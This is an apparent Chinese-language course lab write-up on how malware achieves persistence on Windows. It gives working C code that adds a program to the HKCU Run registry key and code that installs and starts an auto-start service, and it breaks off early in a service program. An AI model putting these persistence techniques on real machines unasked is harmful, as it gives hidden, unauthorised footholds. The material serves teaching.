<!DOCTYPE html>
<html lang="en">
    
    <style>
        body
        {
            font-family: "Times New Roman", Helvetica, Tahoma, Arial,   LXGW WenKai   "notoserifsc-medium", "Microsoft YaHei", "Hiragino Sans GB", "WenQuanYi Micro Hei", sans-serif !important;

        }
    </style>

    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
    <meta name="description" content="Malware Analysis Practice2" />
    <meta name="hexo-theme-A4" content="v1.9.0" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>Jay1an</title>

    
        
<link rel="stylesheet" href="/css/highlight/style1.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--注意：首页既不是post也不是page-->
        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--返回顶部css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--目录-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    

    
        
<link rel="stylesheet" href="/css/returnToLastPage.css">

    
    
   
<link rel="stylesheet" href="/css/lightgallery.min.css">


<meta name="generator" content="Hexo 7.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #323e74; 
            --waline-color: #323e74; 
            --waline-border-color: #323e74; 
            --waline-white: #323e74; 
            --waline-bgcolor-light: #f2fafc;  
        }
        body {
            color: #323e74;
            background: #eaeae8;
        }
        .post-md code {
            background: #e7f7f3;
            color: #7f688d; 
        }
        .post-md pre, .post-md .highlight {
            background: #e7f7f3;
            color: #7f688d; 
        }
        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
            color: #323e74;
        }
        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
            color: #323e74;
        }
        .year-font-color {
            color: #323e74 !important;
        }
        .wl-card span.wl-nick {
            color: #323e74; 
        }
        .wl-card .wl-badge {
            border: 1px solid #323e74;
            color: #323e74; 
        }
        .wl-btn {
            border: 1px solid #323e74; 
            color:  #323e74;  
        }
        .wl-btn.primary {
            color: #f2fafc; 
        }
        .wl-header label {
            color: #323e74;
        }
        a {
            color: #7f688d;
        }

        .post-md a {
            color: #7f688d;
        }

        .nav li a {
            color: #7f688d;
        }

        .archive-main a:link {
            color: #7f688d;
        }
        .archive-main a:visited {
            color: #767c7c; 
        }

        .archive li span {
            color: #323e74;
        }

        .post-main-title {
            color: #323e74;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #323e74;
        }

        [data-waline] p {
            color: #323e74;
        }
        [data-waline] a {
            color: #323e74;
        } 
        .wl-sort li.active {
            color: #323e74;
        }

        .wl-card .wl-meta>span {
            background: #f2fafc;
        }

        .paper {
            background: #eaeae8;
        }

        .index-main {
            background: #f2fafc;
        }

        .paper-main {
            background: #f2fafc;
        }

        .wl-panel {
            background: #f2fafc;
        }

        .archive li:nth-child(odd) {
            background: #f2fafc;
            ;
        }

        .archive li:nth-child(even) {
            background: #f2fafc;
        }

        .post-md table tr:nth-child(odd) td {
            background: #f2fafc;
        }

        .post-md table tr:nth-child(even) td {
            background: #f2fafc;
        }

    
        .progress-wrap::after {
            color: #323e74; /* 箭头的颜色 */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #323e74; /* 边框的颜色 */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, #7f688d, #7f688d); /* 鼠标滑过的箭头颜色 */
         }

        .return-to-last-progress-wrap::after {
            color: #323e74; /* 箭头的颜色 */
        }
        .return-to-last-progress-wrap svg.progress-circle path {
	        stroke: #323e74; /* 边框的颜色 */
        }
        .return-to-last-progress-wrap::before {
	        background-image: linear-gradient(298deg, #7f688d, #7f688d); /* 鼠标滑过的箭头颜色 */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #323e74; /* 设置滚动条拖动块的颜色 */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: #7f688d;
            border-left-color: #7f688d;
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #323e74;
        }
    </style>

    
    
    <body>
        <script src="/js/darkmode-js.min.js"></script>
        
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    


<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">Jay1an</a> 
            <span class="description">I am who I am.</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">首页</a></li>
            
        
            
                <li><a href="/list/">文章</a></li>
            
        
            
                <li><a href="/categories/">分类</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--说明是文章post页面-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            Malware Analysis Practice2
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B7%BB%E5%8A%A0%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="post-toc-text">通过修改注册表添加服务的方式实现自启动</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82"><span class="post-toc-text">实验要求</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="post-toc-text">实验环境</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="post-toc-text">实验目的</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="post-toc-text">实验步骤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%AE%9E%E8%B7%B5-1-%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="post-toc-text">实践-1-修改注册表自启动</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#Run-RunOnce-RunOnceEx%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="post-toc-text">Run&#x2F;RunOnce&#x2F;RunOnceEx的区别</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%AE%9E%E8%B7%B5-2-%E6%B7%BB%E5%8A%A0%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="post-toc-text">实践-2-添加服务实现自启动</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="post-toc-text">参考资料</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#DLL%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99"><span class="post-toc-text">DLL文件编写</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-1"><span class="post-toc-text">实验要求</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-1"><span class="post-toc-text">实验环境</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84-1"><span class="post-toc-text">实验目的</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-1"><span class="post-toc-text">实验步骤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E7%94%9F%E6%88%90DLL%E6%96%87%E4%BB%B6"><span class="post-toc-text">生成DLL文件</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E8%B0%83%E7%94%A8DLL%E6%96%87%E4%BB%B6"><span class="post-toc-text">调用DLL文件</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="post-toc-text">测试</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%AE%80%E5%8D%95%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="post-toc-text">简单多线程服务器</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-2"><span class="post-toc-text">实验要求</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-2"><span class="post-toc-text">实验环境</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84-2"><span class="post-toc-text">实验目的</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-2"><span class="post-toc-text">实验步骤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9A%84%E4%BB%A3%E7%A0%81task3-server-cpp"><span class="post-toc-text">服务端的代码task3_server.cpp</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%A3%E7%A0%81task3-client-cpp"><span class="post-toc-text">客户端的代码task3_client.cpp</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E6%B5%8B%E8%AF%95-1"><span class="post-toc-text">测试</span></a></li></ol></li></ol></li></ol></li></ol>
            
        
        <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css" /><div class="article-gallery"><h2 id="通过修改注册表添加服务的方式实现自启动"><a href="#通过修改注册表添加服务的方式实现自启动" class="headerlink" title="通过修改注册表添加服务的方式实现自启动"></a>通过修改注册表添加服务的方式实现自启动</h2><h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><ul>
<li>编写代码，编辑注册表的Run&#x2F;RunOnce&#x2F;RunOnceEx键（任选其一，并明确三个键的区别），达到让某一程序在系统启动后自动运行的目的（可以以计算器、记事本等作为目标程序）。</li>
<li>以服务方式实现自启动，以DLL或者EXE方式均可。</li>
</ul>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li>Windows 7或Windows 10主机（虚拟机）；</li>
<li>代码编辑器；</li>
<li>C&#x2F;C++代码运行所需环境。</li>
</ul>
<h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>了解恶意代码自启动常用手段。</p>
<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="实践-1-修改注册表自启动"><a href="#实践-1-修改注册表自启动" class="headerlink" title="实践-1-修改注册表自启动"></a>实践-1-修改注册表自启动</h4><p>利用C语言编程，编辑<code>HKEY_CURRENT_USER</code>下的自启动健<code>Run</code>，实现开机自启动谷歌浏览器。</p>
<p>用到了<code>Windows.h</code>库的<code>regOpenResultEx</code>函数和<code>regSetValueEx</code>等函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    LONG regOpenResult;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开注册表键</span></span><br><span class="line">    <span class="comment">// 注：HKEY_CURRENT_USER表示只针对当前用户，若要改为HKEY_LOCAL_MACHINE则需要管理员权限</span></span><br><span class="line">    regOpenResult = RegOpenKeyEx(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (regOpenResult != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法打开注册表键: %d\n&quot;</span>, regOpenResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置键值的名字对应的值</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name = <span class="string">&quot;auto_run_chrome&quot;</span>; </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* value = <span class="string">&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&quot;</span>;   <span class="comment">// 设置要自启动的程序的路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//将其写入run下</span></span><br><span class="line">    regOpenResult = RegSetValueEx(hKey,name,<span class="number">0</span>,REG_SZ,value,<span class="built_in">strlen</span>(value)+<span class="number">1</span>); </span><br><span class="line">    <span class="keyword">if</span>(regOpenResult != ERROR_SUCCESS)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;自启动项写入失败:%d\n&quot;</span>,regOpenResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;自启动项写入成功!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭注册表键</span></span><br><span class="line">    RegCloseKey(hKey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\jay1an\Desktop\<span class="number">2023</span><span class="number">-10</span><span class="number">-30</span>&gt; gcc .\task1.c</span><br><span class="line">PS C:\Users\jay1an\Desktop\<span class="number">2023</span><span class="number">-10</span><span class="number">-30</span>&gt; .\a.exe</span><br><span class="line">自启动项写入成功!</span><br></pre></td></tr></table></figure>

<p>然后再查看注册表，会发现谷歌浏览器已经被添加到run下了。</p>
<p><a href="/../img/Malware-Analysis-Practice2/1.png" title="1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/1.png" alt="1"></a></p>
<p>切换用户时（重启动也算），电脑会自动打开谷歌浏览器。</p>
<h5 id="Run-RunOnce-RunOnceEx的区别"><a href="#Run-RunOnce-RunOnceEx的区别" class="headerlink" title="Run&#x2F;RunOnce&#x2F;RunOnceEx的区别"></a><code>Run</code>&#x2F;<code>RunOnce</code>&#x2F;<code>RunOnceEx</code>的区别</h5><p>只考虑在 <code>HKEY_CURRENT_USER</code> 下的情况，<code>HKEY_CURRENT_USER</code> 中的项目只适用于当前登录的用户。</p>
<p>下面是有关 <code>Run</code>、<code>RunOnce</code> 和 <code>RunOnceEx</code> 键的主要区别：</p>
<ol>
<li><strong><code>Run</code>键</strong> (<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>)：<ul>
<li><strong>执行时机</strong>：这个键中的项目在当前用户每次登录后都会自动运行，包括系统启动和用户切换。</li>
</ul>
</li>
<li><strong><code>RunOnce</code>键</strong> (<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>)：<ul>
<li><strong>执行时机</strong>：这个键中的项目只在当前用户的下一次登录后运行一次，然后自动从注册表中删除。</li>
</ul>
</li>
<li><strong><code>RunOnceEx</code>键</strong> (<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>)：<ul>
<li><strong>执行时机</strong>：这个键中的项目类似于<code>RunOnce</code>键，只在当前用户的下一次登录后运行一次，然后自动从注册表中删除。</li>
<li><strong>额外特性</strong>：<code>RunOnceEx</code>键允许更复杂的操作，如在项目中指定一个批处理文件或脚本，以便在登录时执行多个命令。</li>
</ul>
</li>
</ol>
<p>在单个用户的情况下，可以使用 <code>Run</code> 键来配置在每次该用户登录时自动运行的程序，而 <code>RunOnce</code> 键用于配置只在该用户的下一次登录时运行一次的程序。<code>RunOnceEx</code> 提供了更高级的选项，可以用于执行复杂的任务。</p>
<h4 id="实践-2-添加服务实现自启动"><a href="#实践-2-添加服务实现自启动" class="headerlink" title="实践-2-添加服务实现自启动"></a>实践-2-添加服务实现自启动</h4><p>创建服务的代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SC_HANDLE schSCManager, schService;</span><br><span class="line">    <span class="comment">// 填写系统服务exe文件</span></span><br><span class="line">    TCHAR szPath[MAX_PATH] = <span class="string">&quot;C:\\Users\\jay1an\\Desktop\\Practice2\\2023-11-13-service\\myservice.exe&quot;</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 打开服务控制管理器</span></span><br><span class="line">    schSCManager = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span> (schSCManager == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        DWORD error = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">if</span> (error == ERROR_ACCESS_DENIED) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Access denied. Run the program as administrator.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OpenSCManager failed (%d)\n&quot;</span>, error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建服务并设置其启动参数</span></span><br><span class="line">    schService = <span class="built_in">CreateService</span>(</span><br><span class="line">        schSCManager,               <span class="comment">// SCManager database</span></span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;myservice&quot;</span>),          <span class="comment">// name of service</span></span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;malicious code lab&quot;</span>), <span class="comment">// name to display</span></span><br><span class="line">        SERVICE_ALL_ACCESS,         <span class="comment">// desired access</span></span><br><span class="line">        SERVICE_WIN32_OWN_PROCESS,  <span class="comment">// service type</span></span><br><span class="line">        SERVICE_AUTO_START,         <span class="comment">// start type</span></span><br><span class="line">        SERVICE_ERROR_NORMAL,       <span class="comment">// error control type</span></span><br><span class="line">        szPath,                     <span class="comment">// path to service&#x27;s binary</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// no load ordering group</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// no tag identifier</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// no dependencies</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// LocalSystem account</span></span><br><span class="line">        <span class="literal">NULL</span>                        <span class="comment">// no password</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (schService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;CreateService failed (%d)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">CloseServiceHandle</span>(schSCManager);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Service installed successfully.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动服务</span></span><br><span class="line">    <span class="comment">// 这里需要管理员权限</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">StartService</span>(schService, <span class="number">0</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;StartService failed (%d)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Service starts successfully.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭句柄</span></span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(schService);</span><br><span class="line">    <span class="built_in">CloseServiceHandle</span>(schSCManager);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用管理员权限运行创建-启动服务的程序：</p>
<p><a href="/../img/Malware-Analysis-Practice2/10.png" title="10" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/10.png" alt="10"></a></p>
<p>可以在windows注册表(<code>regedit</code>)中查看，也可以在服务控制台(<code>services.msc</code>)中查看。</p>
<p><a href="/../img/Malware-Analysis-Practice2/11.png" title="11" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/11.png" alt="11"></a></p>
<blockquote>
<p>服务注册表位于注册表路径 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\YourServiceName</code> 下，其中 <code>YourServiceName</code> 是你的服务的名称。</p>
</blockquote>
<p>在 Windows 操作系统中，服务注册表中的 <code>ImagePath</code> 是服务二进制文件的路径。该注册表项指定了服务的可执行文件位置。当服务被启动时，系统将加载该二进制文件，并执行其中的服务代码。</p>
<p><code>Start</code>的值为2，表示该服务在系统启动时自动启动。</p>
<p><strong>但是自启动服务程序并不是普通的程序，而是要求程序创建服务入口点函数，否则，不能启动系统服务。</strong></p>
<p>myservice.cpp代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_BUFLEN 1024</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">SERVICE_STATUS        g_ServiceStatus = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">SERVICE_STATUS_HANDLE g_StatusHandle = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE                